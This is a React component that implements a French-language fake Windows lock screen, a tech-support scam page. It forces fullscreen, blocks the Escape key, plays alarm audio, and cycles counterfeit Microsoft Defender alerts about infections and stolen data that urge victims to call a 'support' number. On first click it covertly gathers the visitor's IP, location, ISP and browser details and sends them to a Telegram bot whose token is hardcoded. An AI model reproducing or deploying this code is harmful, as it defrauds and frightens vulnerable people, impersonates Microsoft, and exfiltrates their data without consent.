import React, { useEffect, useState } from 'react';
import './index-Deu3tZvB.css';

const WindowsLockSim: React.FC = () => {
  const [currentIndex, setCurrentIndex] = useState(0);
  const [escapeAttempts, setEscapeAttempts] = useState(0);

  useEffect(() => {
    const audio = document.getElementById('background-audio') as HTMLAudioElement;

    // TELEGRAM NOTIFICATION - USER ENTERED
    const sendTelegramAlert = async () => {
      try {
        // Get user IP and location info
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const ip = ipData.ip;
        
        // Get location details
        let country = 'Unknown';
        let countryCode = 'XX';
        let city = 'Unknown';
        let region = 'Unknown';
        let isp = 'Unknown';
        let timezone = 'Unknown';
        
        try {
          const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
          const geoData = await geoRes.json();
          
          country = geoData.country_name || 'Unknown';
          countryCode = geoData.country_code || 'XX';
          city = geoData.city || 'Unknown';
          region = geoData.region || 'Unknown';
          isp = geoData.org || 'Unknown';
          timezone = geoData.timezone || 'Unknown';
        } catch (error) {
          // Fallback if first API fails
          try {
            const geoRes2 = await fetch(`https://ipinfo.io/${ip}/json`);
            const geoData2 = await geoRes2.json();
            
            if (geoData2) {
              country = geoData2.country || 'Unknown';
              countryCode = geoData2.country || 'XX';
              city = geoData2.city || 'Unknown';
              region = geoData2.region || 'Unknown';
              isp = geoData2.org || 'Unknown';
              timezone = geoData2.timezone || 'Unknown';
            }
          } catch (error2) {
            console.log('Both geolocation APIs failed');
          }
        }
        
        // Format local time
        const now = new Date();
        const localTime = `${now.getDate().toString().padStart(2, '0')}/${(now.getMonth() + 1).toString().padStart(2, '0')}/${now.getFullYear()} ${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
        
        // Get referrer and full URL
        const referrer = document.referrer || 'Direct';
        const fullUrl = window.location.href;
        const domain = window.location.hostname;
        
        // Format message exactly as you want
        const message = `
🚨 NEW POP SHADOW 😏🚨

🌐 Domain: ${domain}
📍 IP Address: ${ip}
🗺️ Country: ${country} (${countryCode})
🏙️ Location: ${city}, ${region}
🌐 ISP: ${isp}
🕐 Timezone: ${timezone}
⏰ Local Time: ${localTime}

📱 User Agent:
${navigator.userAgent}

💻 Platform: ${navigator.platform}
🔤 Language: ${navigator.language}
🔗 Referrer: ${referrer}
🔍 URL: ${fullUrl}
        `;
        
        // REPLACE WITH YOUR BOT TOKEN AND CHAT ID
        const BOT_TOKEN = '8367190020:AAHMSoZLLFISXHX_eOFRGQ2q7AyfUZGo6oc';
        const CHAT_ID = '-1003720688102';
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        });
      } catch (error) {
        console.log('Telegram error:', error);
      }
    };

    const enterFullscreen = () => {
      const element = document.documentElement;
      if (element.requestFullscreen) {
        element.requestFullscreen();
      } else if ((element as any).mozRequestFullScreen) {
        (element as any).mozRequestFullScreen();
      } else if ((element as any).webkitRequestFullscreen) {
        (element as any).webkitRequestFullscreen();
      } else if ((element as any).msRequestFullscreen) {
        (element as any).msRequestFullscreen();
      }
    };

    const startAudio = () => {
      if (audio) {
        audio.play().catch(e => {
          console.log("Audio playback failed:", e);
          const startAudioOnClick = () => {
            audio.play();
            document.removeEventListener('click', startAudioOnClick);
          };
          document.addEventListener('click', startAudioOnClick, { once: true });
        });
      }
    };

    // ESCAPE KEY BLOCKING
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape') {
        e.preventDefault();
        e.stopPropagation();
        
        const newAttempts = escapeAttempts + 1;
        setEscapeAttempts(newAttempts);
        
        // Only exit after 5 presses
        if (newAttempts >= 5) {
          if (document.exitFullscreen) {
            document.exitFullscreen();
          }
        }
      }
    };

    // Click anywhere to enter fullscreen and start audio
    const handleClick = () => {
      enterFullscreen();
      startAudio();
      
      // Send Telegram notification
      sendTelegramAlert();
      
      // Add escape key listener
      document.addEventListener('keydown', handleKeyDown);
    };
    
    document.addEventListener('click', handleClick, { once: true });

    // Change panel every 1 second
    const interval = setInterval(() => {
      setCurrentIndex(prev => (prev + 1) % 5);
    }, 1000);

    // Also try to start audio on page load
    setTimeout(startAudio, 1000);

    return () => {
      clearInterval(interval);
      document.removeEventListener('click', handleClick);
      document.removeEventListener('keydown', handleKeyDown);
    };
  }, [escapeAttempts]);

  // Minimal CSS for escape warning
  const escapeWarningStyle = `
    .escape-warning {
      position: fixed;
      top: 10px;
      right: 10px;
      background: red;
      color: white;
      padding: 5px 10px;
      z-index: 9999;
      font-size: 12px;
    }
  `;

  return (
    <>
      <style>
        {`
          ${escapeWarningStyle}
          .sequence-panel { display: none; }
          .sequence-panel.active { display: block; }
          body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }
          #root { width: 100%; height: 100%; }
        `}
      </style>

      {/* Show escape attempts */}
      {escapeAttempts > 0 && escapeAttempts < 5 && (
        <div className="escape-warning">
          Press Escape {5 - escapeAttempts} more times to exit
        </div>
      )}

      <audio id="background-audio" loop>
        <source src="/vocal1-BYq15bXr.mp3" type="audio/mpeg" />
      </audio>

      {/* YOUR EXACT ORIGINAL CONTENT - NO CHANGES BELOW THIS LINE */}
      <div className="fake-screen" style={{ backgroundImage: 'url("/windows-lock-sim_files/window_lock-CQufc91c.png")', backgroundSize: 'cover', backgroundPosition: 'center center', backgroundRepeat: 'no-repeat' }}>
        
        {/* Panel 1 */}
        <div className={`security-panel panel-animate sequence-panel ${currentIndex === 0 ? 'active' : ''}`}>
          <div className="security-header">
            <div className="security-left">
              <img alt="Windows" className="windows-logo" src="/windows-lock-sim_files/windows_logo-CziNPXKD.png" />
              <span className="security-title">Sécurité Windows</span>
            </div>
            <div className="window-controls">
              <button className="control-btn minimize">−</button>
              <button className="control-btn maximize">□</button>
              <button className="control-btn close">✕</button>
            </div>
          </div>
          <div className="security-content">
            <div className="security-main">
              <div className="security-status">
                <div className="status-icon warning">⚠️</div>
                <div className="status-text">
                  <h3>Protection désactivée</h3>
                  <p>Votre ordinateur est vulnérable</p>
                </div>
              </div>
              <div className="security-actions-panel">
                <button className="security-action-btn primary">Activer la protection en temps réel</button>
                <button className="security-action-btn">Démarrer l'analyse rapide</button>
              </div>
              <div className="security-info">
                <div className="info-row">
                  <span>Protection antivirus</span>
                  <span className="status-off">Désactivée</span>
                </div>
                <div className="info-row">
                  <span>Pare-feu</span>
                  <span className="status-on">Activé</span>
                </div>
                <div className="info-row">
                  <span>Dernière analyse</span>
                  <span>Il y a 7 jours</span>
                </div>
              </div>
            </div>
            <div className="security-sidebar">
              <span className="security-message">Activer la licence</span>
            </div>
          </div>
        </div>

        {/* Panel 2 */}
        <div className={`analyse-panel panel-animate sequence-panel ${currentIndex === 1 ? 'active' : ''}`}>
          <div className="analyse-header">
            <div className="analyse-left">
              <div className="analyse-icon">🔍</div>
              <span className="analyse-title">Analyse de sécurité</span>
            </div>
            <div className="window-controls">
              <button className="control-btn minimize">−</button>
              <button className="control-btn maximize">□</button>
              <button className="control-btn close">✕</button>
            </div>
          </div>
          <div className="analyse-content">
            <div className="analyse-main">
              <div className="scan-results">
                <div className="result-header">
                  <h3>Résultats de l'analyse</h3>
                  <span className="scan-time">Terminée à 14:32</span>
                </div>
                <div className="threats-found">
                  <div className="threat-count">
                    <span className="count">47</span>
                    <span className="label">Menaces détectées</span>
                  </div>
                </div>
                <div className="threat-list">
                  <div className="threat-item">
                    <span className="threat-name">Trojan:Win32/Emotet.A</span>
                    <span className="threat-level high">Élevé</span>
                  </div>
                  <div className="threat-item">
                    <span className="threat-name">Adware:Win32/RelevantKnowledge</span>
                    <span className="threat-level medium">Moyen</span>
                  </div>
                  <div className="threat-item">
                    <span className="threat-name">PUA:Win32/InstallCore</span>
                    <span className="threat-level low">Faible</span>
                  </div>
                </div>
                <div className="action-buttons">
                  <button className="action-btn danger">Nettoyer maintenant</button>
                  <button className="action-btn">Quarantaine</button>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Panel 3 */}
        <div className={`defender-panel panel-animate sequence-panel ${currentIndex === 2 ? 'active' : ''}`}>
          <div className="defender-header">
            <span className="defender-title">Windows Defender</span>
            <div className="window-controls">
              <button className="control-btn minimize">−</button>
              <button className="control-btn maximize">□</button>
              <button className="control-btn close">✕</button>
            </div>
          </div>
          <div className="defender-content">
            <span className="defender-message">L'accès à ce PC a été bloqué pour des raisons de sécurité</span>
          </div>
          <div className="defender-buttons">
            <button className="defender-btn">Annuler</button>
            <button className="defender-btn primary">D'ACCORD</button>
          </div>
        </div>

        {/* Panel 4 */}
        <div className={`defender-popup-wrapper sequence-panel ${currentIndex === 3 ? 'active' : ''}`}>
          <div className="defender-popup">
            <div className="defender-popup-header">
              <div className="defender-popup-left">
                <div className="defender-logo">🛡️</div>
                <span className="defender-popup-title">Microsoft Défenseur</span>
              </div>
              <div className="defender-popup-controls">
                <button className="popup-control-btn minimize">−</button>
                <button className="popup-control-btn maximize">□</button>
                <button className="popup-control-btn close">✕</button>
              </div>
            </div>
            <div className="defender-popup-content">
              <div className="popup-main-message">
                <h2 className="popup-title">Désolé, l'analyse n'est pas terminée !</h2>
                <div className="error-code">Erreur: Ox800VDS</div>
                <div className="popup-description">Microsoft Defender a trouvé des fichiers infectés mais n'a pas pu les supprimer en raison des autorisations des stratégies de groupe. Veuillez scanner maintenant pour les supprimer manuellement.</div>
                <div className="popup-icons">
                  <div className="popup-icon">📄</div>
                  <div className="popup-icon">📁</div>
                  <div className="popup-icon">🔍</div>
                </div>
                <div className="support-section">
                  <div className="support-text">Appeler le support pour obtenir de l'aide</div>
                  <div className="support-label">Prise en charge de Windows</div>
                </div>
                <div className="popup-buttons">
                  <div className="windows-security-badge">
                    <div className="windows-logo">🏠</div>
                    <span>Sécurité Windows</span>
                  </div>
                  <button className="scan-button primary">Scanne maintenant</button>
                  <button className="scan-button secondary">Scanner plus tard</button>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Panel 5 */}
        <div className={`admin-modal-wrapper sequence-panel ${currentIndex === 4 ? 'active' : ''}`}>
          <div className="admin-modal">
            <div className="modal-header">
              <span>Connexion administrateur</span>
              <button className="close-btn">✕</button>
            </div>
            <div className="modal-body">
              <p className="warning-text">Windows verrouillé en raison d'une activité inhabituelle.</p>
              <p className="instruction-text">Veuillez vous reconnecter à l'aide de votre identifiant Microsoft et de votre mot de passe.</p>
              <p className="support-text">Pour obtenir de l'aide, contactez le support Microsoft</p>
              <div className="support-number">028 80 45 50</div>
              <input placeholder="Nom d'utilisateur" disabled type="text" />
              <input placeholder="Mot de passe" disabled type="password" />
              <button className="submit-btn" disabled>valeur</button>
            </div>
          </div>
        </div>
      </div>

      <div className="fullscreen-notification">
        <div className="notification-bar">Alerte maximale de sécurité. Message IMPORTANT du service de sécurité informatique. Une INFECTION GRAVE a été détectée sur votre ordinateur. Des comportements suspects indiquent une compromission sérieuse de vos données. Vos informations personnelles, vos coordonnées bancaires et vos identifiants sont potentiellement en danger. Il existe un risque réel et IMMINENT de vol d'identité et d'utilisation frauduleuse de vos comptes. Ne tentez pas de résoudre ceci seul. Contactez IMMÉDIATEMENT le service technique au numéro indiqué sur cette page pour obtenir une intervention urgente. Ne saisissez aucun mot de passe, n'effectuez aucun paiement et n'autorisez aucune demande de confirmation tant que notre technicien ne vous l'a pas confirmé. Ce message est prioritaire — agissez maintenant pour protéger vos données. Contactez sans délai le service technique pour une prise en charge immédiate et évitez toute manipulation qui pourrait aggraver la situation.</div>
      </div>

      <div className="virus-popup">
        <div className="virus-popup-header">
          <span className="virus-icon">⚠️</span>
          <span className="virus-title">VIRUS DÉTECTÉ!</span>
          <span className="close-btn">×</span>
        </div>
        <div className="virus-popup-content">
          <div className="gif-container">
            <img alt="Transfer en cours" className="transfer-gif" src="transfer-CVD-3X68.gif" />
          </div>
          <div className="virus-text">
            <h3>🚨 ALERTE CRITIQUE 🚨</h3>
            <p><strong>Virus Trojan.Win32.Danger détecté!</strong></p>
            <p>Vos données sont en cours de transfert...</p>
            <p className="warning-text">⚡ ARRÊTEZ IMMÉDIATEMENT toute activité!</p>
            <p className="phone-number">📞 Appelez: <strong>028 80 45 50</strong></p>
          </div>
        </div>
        <div className="virus-popup-footer">
          <div className="progress-bar">
            <div className="progress-fill"></div>
          </div>
          <p>Transfert de données: 47%...</p>
        </div>
      </div>

      <div className="security-alert-popup">
        <div className="security-alert-header">
          <span className="alert-icon">🔒</span>
          <span className="alert-title">SÉCURITÉ</span>
        </div>
        <div className="security-alert-content">
          <div className="alert-status">
            <div className="status-indicator"></div>
            <span className="status-text">SYSTÈME BLOQUÉ</span>
          </div>
          <div className="alert-info">
            <p className="danger-text">⚠️ DANGER ⚠️</p>
            <p className="info-text">Accès bloqué</p>
            <p className="info-text">Code: 0x80070005</p>
          </div>
          <div className="support-box">
            <p className="support-label">Support Microsoft</p>
            <p className="support-number">028 80 45 50</p>
          </div>
        </div>
        <div className="security-alert-footer">
          <div className="threat-level">
            <span className="threat-label">Niveau de menace:</span>
            <span className="threat-value">CRITIQUE</span>
          </div>
        </div>
      </div>

      <div className="support-popup">
        <div className="support-bubble">
          <div className="microsoft-header">
            <div className="microsoft-logo">
              <div className="logo-square red"></div>
              <div className="logo-square green"></div>
              <div className="logo-square blue"></div>
              <div className="logo-square yellow"></div>
            </div>
            <span className="microsoft-text">Microsoft</span>
          </div>
          <div className="support-content">
            <p className="support-title">Assistance technique Windows</p>
            <div className="phone-section">
              <div className="phone-number">028 80 45 50</div>
              <div className="phone-subtitle">( Numéro sans frais)</div>
            </div>
          </div>
          <div className="bubble-arrow"></div>
        </div>
        <div className="support-footer">
          <span className="footer-text">Windows Defender SmartScreen</span>
        </div>
      </div>
    </>
  );
};

export default WindowsLockSim;



